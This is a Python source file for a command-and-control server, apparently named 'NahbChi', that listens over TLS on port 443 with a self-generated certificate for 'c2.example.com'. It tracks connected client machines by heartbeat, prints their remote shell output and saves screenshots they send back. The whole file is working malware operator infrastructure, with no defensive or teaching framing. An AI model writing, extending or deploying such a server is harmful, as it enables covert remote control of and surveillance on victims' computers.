#!/usr/bin/env python3
import socket
import ssl
import threading
import struct
import os
import base64
import json
import time
from datetime import datetime, timedelta
from typing import Optional, Tuple, Dict

BANNER = r"""
 ███▄    █  ▄▄▄       ██░ ██  ▄▄▄▄    ▄████▄   ██░ ██  ██▓
 ██ ▀█   █ ▒████▄    ▓██░ ██▒▓█████▄ ▒██▀ ▀█  ▓██░ ██▒▓██▒
▓██  ▀█ ██▒▒██  ▀█▄  ▒██▀▀██░▒██▒ ▄██▒▓█    ▄ ▒██▀▀██░▒██▒
▓██▒  ▐▌██▒░██▄▄▄▄██ ░▓█ ░██ ▒██░█▀  ▒▓▓▄ ▄██▒░▓█ ░██ ░██░
▒██░   ▓██░ ▓█   ▓██▒░▓█▒░██▓░▓█  ▀█▓▒ ▓███▀ ░░▓█▒░██▓░██░
░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░▒░▒░▒▓███▀▒░ ░▒ ▒  ░ ▒ ░░▒░▒░▓  
░ ░░   ░ ▒░  ▒   ▒▒ ░ ▒ ░▒░ ░▒░▒   ░   ░  ▒    ▒ ░▒░ ░ ▒ ░
   ░   ░ ░   ░   ▒    ░  ░░ ░ ░    ░ ░         ░  ░░ ░ ▒ ░
         ░       ░  ░ ░  ░  ░ ░      ░ ░       ░  ░  ░ ░  
                                   ░ ░                    
"""

class C2Server:
    # C2 server class to manage communication with clients.

    def __init__(self, host: str = '0.0.0.0', port: int = 443):
        self.host = host
        self.port = port
        self.ssl_context = self.create_ssl_context()
        self.clients: Dict[Tuple[str, int], dict] = {}  # Connected clients mapping
        self.lock = threading.Lock()
        self.running = True
        self.screenshot_dir = "screenshots"
        os.makedirs(self.screenshot_dir, exist_ok=True)  # Ensure screenshot directory exists

    def create_ssl_context(self) -> ssl.SSLContext:
        # Creates and returns the SSL context for the server.
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.minimum_version = ssl.TLSVersion.TLSv1_2

        # Could do this: check certificates and regenerate only if necessary for better performance.
        if not os.path.exists('server.crt') or not os.path.exists('server.key'):
            self.generate_self_signed_cert()
        
        context.load_cert_chain('server.crt', 'server.key')
        return context

    def generate_self_signed_cert(self):
        # Generate a self-signed certificate if valid certificates don't exist.
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend

        # Generate private key
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Create self-signed certificate
        subject = issuer = x509.Name([  # Would change this for better security practices.
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "My Company"),
            x509.NameAttribute(NameOID.COMMON_NAME, "c2.example.com"),
        ])

        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),  # Could do this if needed for broader certificate usage.
            critical=False,
        ).sign(key, hashes.SHA256(), default_backend())

        # Save the certificate and private key
        with open("server.crt", "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open("server.key", "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))

    def log(self, message: str):
        # Log messages with timestamp.
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}")

    def send_packet(self, conn: socket.socket, ptype: int, cid: int, data: bytes) -> bool:
        # Sends a packet to the client. Returns True if successful.
        try:
            header = struct.pack('>II', ptype, cid)
            packet = header + data
            conn.sendall(struct.pack('>I', len(packet)) + packet)
            return True
        except (BrokenPipeError, ConnectionResetError):
            return False
        except Exception as e:
            self.log(f"Send error: {e}")
            return False

    def receive_packet(self, conn: socket.socket) -> Optional[Tuple[int, int, bytes]]:
        # Receives a packet from the client and returns (ptype, cid, data).
        try:
            len_data = conn.recv(4)
            if not len_data or len(len_data) != 4:
                return None

            length = struct.unpack('>I', len_data)[0]
            if length > 10 * 1024 * 1024 or length < 8:  # Limits the packet size
                return None

            packet = b''
            remaining = length
            while remaining > 0:
                chunk = conn.recv(min(4096, remaining))  # Could do this for better efficiency.
                if not chunk:
                    return None
                packet += chunk
                remaining -= len(chunk)

            return struct.unpack('>II', packet[:8]) + (packet[8:],)
        except socket.timeout:
            return None
        except (ConnectionResetError, BrokenPipeError):
            return None
        except Exception as e:
            self.log(f"Receive error: {e}")
            return None

    def handle_client(self, conn: socket.socket, addr: Tuple[str, int]):
        # Handles communication with a client.
        client_id = f"{addr[0]}:{addr[1]}"
        try:
            # Initial handshake check
            init_packet = self.receive_packet(conn)
            if not init_packet or init_packet[0] != 0:
                self.log(f"Invalid handshake from {client_id}")
                return

            client_info = json.loads(init_packet[2].decode())
            self.log(f"New connection from {client_id}: {client_info}")

            with self.lock:
                self.clients[addr] = {
                    'conn': conn,
                    'info': client_info,
                    'last_seen': time.time()
                }

            if not self.send_packet(conn, 1, 0, b"ACK"):
                return

            # Main loop for handling packets from client
            while self.running:
                packet = self.receive_packet(conn)
                if not packet:
                    break

                ptype, cid, data = packet

                if ptype == 1:  # Heartbeat
                    with self.lock:
                        if addr in self.clients:
                            self.clients[addr]['last_seen'] = time.time()
                    if not self.send_packet(conn, 1, cid, b"ACK"):
                        break
                elif ptype == 3:  # Command response
                    self.handle_command_response(client_id, data)
        except Exception as e:
            self.log(f"Client {client_id} error: {e}")
        finally:
            self.cleanup_client(addr)

    def handle_command_response(self, client_id: str, data: bytes):
        # Handles command responses (e.g., status or shell output).
        try:
            decoded = data.decode()
            if decoded.startswith("[STATUS]"):
                print(f"\n{client_id}: {decoded}")
            elif decoded.startswith("[SHELL]"):
                print(decoded)
            elif len(decoded) > 1000:  # Likely a screenshot
                self.save_screenshot(client_id, decoded)
            else:
                print(f"\n{client_id}: {decoded}")
        except UnicodeDecodeError:
            print(f"\n{client_id}: Received binary data")

    def save_screenshot(self, client_id: str, data: str):
        # Save screenshot from the client as a PNG file.
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.screenshot_dir, f"{client_id}_{timestamp}.png")
            with open(path, "wb") as f:
                f.write(base64.b64decode(data))
            self.log(f"Saved screenshot from {client_id} to {path}")
        except Exception as e:
            self.log(f"Failed to save screenshot from {client_id}: {e}")

    def cleanup_client(self, addr: Tuple[str, int]):
        # Removes client from active clients list.
        with self.lock:
            if addr in self.clients:
                del self.clients[addr]

    def start(self):
        # Start the server and listen for client connections.
        self.log("Starting the C2 server...")
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        server_socket.settimeout(60)

        while self.running:
            try:
                client_conn, client_addr = server_socket.accept()
                self.log(f"Client connected: {client_addr}")

                # Wrap the connection with SSL
                client_conn = self.ssl_context.wrap_socket(client_conn, server_side=True)

                # Start a new thread to handle the client
                client_thread = threading.Thread(target=self.handle_client, args=(client_conn, client_addr))
                client_thread.daemon = True
                client_thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                self.log(f"Server error: {e}")

    def stop(self):
        # Stop the server and clean up resources.
        self.running = False
        self.log("Stopping the C2 server...")
